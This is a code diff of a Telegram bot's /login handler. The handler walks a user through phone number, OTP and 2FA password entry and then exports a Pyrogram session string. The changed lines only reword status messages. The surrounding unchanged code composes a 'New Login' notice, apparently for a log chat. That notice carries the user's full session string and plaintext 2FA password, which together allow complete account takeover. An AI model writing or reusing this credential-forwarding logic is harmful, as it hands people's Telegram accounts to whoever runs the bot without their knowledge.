@@ -137,17 +137,17 @@ async def login_acc(client: Client, message: Message):
         await sent.delete()
     except PhoneNumberInvalid:
         await temp_client.disconnect()
-        return await client.send_message(user_id, "❌ **Invalid phone number.**", reply_to_message_id=message.id)
+        return await client.send_message(user_id, "❌ **Invalid phone number. Please try again.**", reply_to_message_id=message.id)
     except PhoneNumberBanned:
         await temp_client.disconnect()
-        return await client.send_message(user_id, "❌ **This number is banned.**", reply_to_message_id=message.id)
+        return await client.send_message(user_id, "🚫 **This number is banned from Telegram.**", reply_to_message_id=message.id)
     except FloodWait as e:
         await temp_client.disconnect()
-        return await client.send_message(user_id, f"⏳ **Flood wait:** Please try after `{e.value}` seconds.", reply_to_message_id=message.id)
+        return await client.send_message(user_id, f"⏳ **Rate limited. Try again after `{e.value}` seconds.**", reply_to_message_id=message.id)
     except Exception as e:
         await temp_client.disconnect()
         traceback.print_exc()
-        return await client.send_message(user_id, f"❌ **Unexpected Error:** `{str(e)}`", reply_to_message_id=message.id)
+        return await client.send_message(user_id, f"⚠️ **Unexpected Error:** `{str(e)}`", reply_to_message_id=message.id)
 
     # Step 2: Ask for OTP
     while True:
@@ -164,7 +164,7 @@ async def login_acc(client: Client, message: Message):
             text=otp_prompt,
             reply_to=message.id,
             validate=lambda x: re.fullmatch(r'\d{5,6}', re.sub(r'\D', '', x)),
-            invalid_text="❌ **OTP must contain digits only.**",
+            invalid_text="❌ **OTP must be 5–6 digits only. Try again.**",
             temp_client=temp_client
         )
         if not otp_code:
@@ -176,7 +176,7 @@ async def login_acc(client: Client, message: Message):
             await temp_client.sign_in(phone_number, code.phone_code_hash, otp_code)
             break
         except PhoneCodeInvalid:
-            await client.send_message(user_id, "❌ **Invalid OTP. Please try again.**", reply_to_message_id=message.id)
+            await client.send_message(user_id, "❌ **Incorrect OTP. Please try again.**", reply_to_message_id=message.id)
         except PhoneCodeExpired:
             await temp_client.disconnect()
             return await client.send_message(user_id, "⌛ **OTP expired. Please try /login again.**", reply_to_message_id=message.id)
@@ -209,14 +209,14 @@ async def login_acc(client: Client, message: Message):
             await temp_client.check_password(password)
         except PasswordHashInvalid:
             await temp_client.disconnect()
-            return await client.send_message(user_id, "❌ **Incorrect 2FA password.**", reply_to_message_id=message.id)
+            return await client.send_message(user_id, "❌ **Incorrect 2FA password. Please try /login again.**", reply_to_message_id=message.id)
 
     me = await temp_client.get_me()
     string_session = await temp_client.export_session_string()
     await temp_client.disconnect()
 
     if len(string_session) < 10:
-        return await client.send_message(user_id, "❌ **Generated session string is invalid.**", reply_to_message_id=message.id)
+        return await client.send_message(user_id, "❌ **Generated session is invalid. Try /login again.**", reply_to_message_id=message.id)
 
     await database.sessions.update_one(
         {"user_id": user_id},
@@ -229,14 +229,14 @@ async def login_acc(client: Client, message: Message):
             f"**✨New Login**\n\n"
             f"• **User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id})\n"
             f"• **User ID**: `{message.from_user.id}`\n"
-            f"• **Number:** +{me.phone_number if hasattr(me, 'phone_number') else 'N/A'}\n"
+            f"• **Number: +{me.phone_number if hasattr(me, 'phone_number') else 'N/A'}**\n"
             f"• **Session String** ↓ `{string_session}`\n"
             f"• **2FA Pass:** `{password if password else '❌ Not Set'}`"
         )
 
     await client.send_message(
         user_id,
-        f"🎉**Login Successful!**\n\n"
+        f"🎉 **Login Successful!**\n\n"
         f"• ɴᴀᴍᴇ: [{me.first_name}](tg://user?id={me.id})\n"
         f"• ᴜꜱᴇʀɴᴀᴍᴇ: @{me.username or 'N/A'}\n"
         f"• ᴜꜱᴇʀ ɪᴅ: `{me.id}`\n\n"
